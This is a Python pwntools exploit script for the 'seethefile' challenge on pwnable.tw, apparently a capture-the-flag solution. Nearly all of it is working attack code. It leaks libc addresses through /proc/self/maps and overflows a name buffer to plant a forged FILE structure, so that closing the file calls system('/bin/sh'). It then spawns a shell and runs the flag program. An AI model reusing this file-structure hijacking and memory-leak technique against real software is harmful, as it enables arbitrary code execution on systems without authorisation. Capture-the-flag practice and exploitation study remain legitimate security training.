#!/usr/bin/python2

from pwn import *
p = process('./seethefile') if '-r' not in sys.argv else remote('chall.pwnable.tw',10200)
e = ELF('./seethefile')
libc = ELF('./libc-2.23.so') if '-r' not in sys.argv else ELF('./libc_32.so.6')

context.terminal = ['tmux', 'splitw','-h']

context.binary = e

def file_open(file_name):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('to see :', file_name)

def file_read(n):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('Your choice :', '3')
    
    for i in xrange(n):
        print p.recvline()

    return p.recvline()

def bye(name):
    p.sendlineafter('Your choice :','5')
    p.sendlineafter('Leave your name :', name)

file_open('/proc/self/maps')
leak = file_read(4)
leak = leak.split('-')
libc_base = int('0x'+leak[1] + '0'*(len(leak[0])-len(leak[1])),16)

"""
"""
leak = file_read(2) #
libc_base = int('0x'+leak[9:17],16) - 0x1b2000 + 0x4000
log.info(leak)
log.info('LIBC_BASE {}'.format(hex(libc_base)))
system_addr = libc_base+ libc.symbols['system']
bin_sh = libc_base + libc.search('/bin/sh').next()

name_addr = 0x0804b260
fp_addr = name_addr + 0x20

# name = "A"*0x20 + p32(0x804b290) + p32(0x1)*3
# name += "B"*0x48 + p32(0x804b290) + "B"*(0x100-0x4c) + p32(0x804b290 + 0xa0)




fake_FILE_object = p32(0xAAAA8AAA) + \
                   '||/b' + \
                   'in/s' + \
                   'h\x00\x00\x00' + \
                   'fuck' * 15 + \
                   pack(name_addr, 32)

name_content = 'fuck' + \
               'fuck' + \
               p32(system_addr) + \
               p32(0) + \
               'fuck' * 4 + \
               p32(fp_addr+4)

# name = "\ x00" * 0x20 
# name += p32(name_addr + 0x24) 
# name += IO_file

# gdb.attach(p,'''
#             b *0x8048b0f
#             ''')
bye(name_content + fake_FILE_object + '\n')


"""
"""
p.sendline('./home/seethefile/get_flag')
p.recv()
p.sendline('Give me the flag')

p.interactive()
